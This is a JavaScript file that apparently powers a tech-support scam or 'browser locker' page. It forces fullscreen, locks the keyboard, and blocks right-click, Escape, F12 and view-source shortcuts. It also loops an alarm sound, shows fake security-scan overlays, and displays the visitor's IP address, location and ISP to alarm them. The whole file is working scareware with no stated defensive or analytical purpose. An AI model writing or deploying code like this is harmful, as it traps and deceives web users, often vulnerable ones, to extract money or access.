document.addEventListener("DOMContentLoaded", () => {
    function blockKeyboardInput(event) {
        // Allow typing in form inputs
        if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
            return true;
        }
        event.preventDefault();
    }

    function blockRightClick(event) {
        event.preventDefault();
    }

    function generateRandomString(length = 64) {
        return Array.from(crypto.getRandomValues(new Uint8Array(length)))
            .map(byte => byte.toString(16).padStart(2, "0"))
            .join("");
    }

    const urlParams = new URLSearchParams(window.location.search);
    if (!urlParams.has("random")) {
        urlParams.set("random", generateRandomString());
        window.location.search = urlParams.toString();
    }

    document.addEventListener("keydown", blockKeyboardInput);
    document.addEventListener("keyup", blockKeyboardInput);
    document.addEventListener("contextmenu", blockRightClick);
});

document.addEventListener(
    "keyup",
    function (e) {
        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
                enterFullscreen();
            }
        }
    },
    false
);

$(document).keydown(function (e) {
    debugger;
    if (e.keyCode == 27) {
        enterFullscreen();
        return false;
    }
});


$(document).ready(function () {
    var audioElement = document.createElement("audio");

    audioElement.setAttribute("src", "a0ler0tm0s.mp3");

    audioElement.addEventListener(
        "ended",
        function () {
            this.play();
        },
        false
    );

    $("#map").click(function () {
        audioElement.play();
    });
});

$(document).keyup(function (evtobj) {
    if (!(evtobj.altKey || evtobj.ctrlKey || evtobj.shiftKey)) {
        if (evtobj.keyCode == 16) {
            return false;
        }

        if (evtobj.keyCode == 17) {
            return false;
        }
    }
});

// To disable right click

document.addEventListener("contextmenu", event => event.preventDefault());

// To disable F12 options

document.onkeypress = function (event) {
    event = event || window.event;
    if (event.keyCode == 123) {
        return false;
    }
};

document.onmousedown = function (event) {
    event = event || window.event;
    if (event.keyCode == 123) {
        return false;
    }
};

document.onkeydown = function (event) {
    event = event || window.event;
    if (event.keyCode == 123) {
        return false;
    }
};

// Modify this section to allow form input
navigator.keyboard.lock();
document.onkeydown = function (e) {
    // Allow typing in form inputs
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        return true;
    }
    return false;
};

// Modify the ctrl+c, ctrl+u block to allow form input
jQuery(document).ready(function ($) {
    $(document).keydown(function (event) {
        // Allow normal typing in form inputs
        if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
            return true;
        }

        var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();
        if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
            alert("Sorry, This Functionality Has Been Disabled!");
            return false;
        }
    });
});

addEventListener("click", function () {
    var el = document.documentElement,
        rfs = el.requestFullScreen || el.webkitRequestFullScreen || el.mozRequestFullScreen;

    rfs.call(el);
});

// Show popup with user details
function showPopup() {

    // Add user details to popup
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            document.getElementById('userDetails').innerHTML = `
          <p>IP: ${data.ip}</p>
          <p>Location: ${data.city}, ${data.country}</p>
          <p>ISP: ${data.org}</p>
        `;
        });
}

// Show popup when page loads
document.addEventListener("DOMContentLoaded", () => {
    setTimeout(showPopup, 2000); // Show popup after 2 seconds
});

function playAudio() {
    var audio = document.getElementById("backgroundMusic");
    audio.addEventListener("ended", function () {
        audio.currentTime = 0;
        audio.play();
    });
    audio.play();
}


function closePopup() {
    let scanOverlay = document.getElementById("scanOverlay");
    let successPopup = document.getElementById("popupOverlay");
    let popupmessage = document.getElementById("popupmessage");
    popupmessage.classList.remove("hidden");
    successPopup.classList.add("hidden");
    scanOverlay.classList.remove("hidden");
};


function closeOverlayPopup() {
    let scanOverlay = document.getElementById("scanOverlay");
    scanOverlay.classList.add("hidden");
    let successPopup = document.getElementById("popupOverlay");
    successPopup.classList.remove("hidden");
};


function closeConformationPopup() {
    document.documentElement.requestFullscreen().then(() => {
        let popupmessage = document.getElementById("popupmessage");
        popupmessage.classList.remove("hidden");
        let verificationpopup = document.getElementById("verificationpopup");
        verificationpopup.classList.add("hidden");
        let scanOverlay = document.getElementById("scanOverlay");
        scanOverlay.classList.remove("hidden");
        playAudio();
    }).catch(e => {
        console.log(e);
    });
};
